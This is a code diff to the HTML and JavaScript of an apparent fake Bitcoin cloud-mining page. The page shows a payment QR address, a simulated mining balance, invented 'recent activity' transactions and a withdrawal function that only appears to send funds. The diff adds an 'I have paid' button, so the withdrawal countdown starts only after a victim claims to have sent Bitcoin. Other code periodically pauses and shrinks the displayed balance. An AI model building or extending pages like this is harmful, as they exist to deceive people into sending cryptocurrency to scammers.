@@ -32,6 +32,7 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
   <div style="text-align:center;margin-top:10px;">
     <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
   </div>
+  <button id="confirmPaymentBtn" onclick="confirmPayment()">I have paid</button>
 </div>
 
 <!-- Mining Dashboard -->
@@ -77,7 +78,7 @@ const txs = document.getElementById("txs");
 let rate = 0.00000008;
 let paused = false;
 
-// ===== Smooth Chart Setup =====
+// ===== Smooth Chart =====
 const canvas = document.getElementById("chart");
 const ctx = canvas.getContext("2d");
 let points = [0];
@@ -116,7 +117,7 @@ setInterval(()=>{
   }
 },1000);
 
-// ===== Fake Recent Activity Scrolling =====
+// ===== Fake Recent Activity =====
 function addFakeTx(){
   const div = document.createElement("div");
   div.className="tx";
@@ -128,19 +129,36 @@ function addFakeTx(){
 }
 setInterval(addFakeTx,1500);
 
-// ===== Withdraw Function =====
+// ===== Withdraw Countdown =====
 const withdrawBtn = document.getElementById("withdrawBtn");
 const withdrawInput = document.getElementById("withdrawAddress");
 const countdown = document.getElementById("countdown");
-const lockDuration = 3*24*60*60*1000; // 3 days in ms
+const lockDuration = 3*24*60*60*1000; // 3 days
+let paymentConfirmed = false;
+let startTime = null;
 
-let startTime = localStorage.getItem("startMiningTime");
-if(!startTime){
+function confirmPayment(){
+  paymentConfirmed = true;
   startTime = Date.now();
-  localStorage.setItem("startMiningTime", startTime);
+  localStorage.setItem("paymentConfirmed", "true");
+  localStorage.setItem("startTime", startTime);
+  document.getElementById("withdrawInfo").innerText = "Withdrawal countdown started!";
+  document.getElementById("confirmPaymentBtn").style.display = "none";
 }
 
+// Restore payment if page reloads
+if(localStorage.getItem("paymentConfirmed")==="true"){
+  paymentConfirmed = true;
+  startTime = parseInt(localStorage.getItem("startTime"));
+  document.getElementById("confirmPaymentBtn").style.display = "none";
+}
+
+// Countdown function
 function updateCountdown(){
+  if(!paymentConfirmed){
+    countdown.innerText = "3d 0h 0m 0s";
+    return;
+  }
   const now = Date.now();
   const elapsed = now - startTime;
   const remaining = lockDuration - elapsed;
@@ -160,6 +178,7 @@ function updateCountdown(){
 setInterval(updateCountdown,1000);
 updateCountdown();
 
+// ===== Withdraw function =====
 function withdrawBTC(){
   const addr = withdrawInput.value.trim();
   if(addr===""){alert("Enter BTC address"); return;}
@@ -170,13 +189,11 @@ function withdrawBTC(){
   },3000);
 }
 
-// ===== 15-min pause and 1-hour drop =====
+// ===== 15-min pause & 1-hour drop =====
 function startPauseCycle(){ setInterval(()=>{ paused=true; setTimeout(()=>{paused=false;},60000); },15*60*1000); }
 startPauseCycle();
-
 function startHourlyDrop(){ setInterval(()=>{ balance*=0.995; },60*60*1000); }
 startHourlyDrop();
 </script>
-
 </body>
 </html>
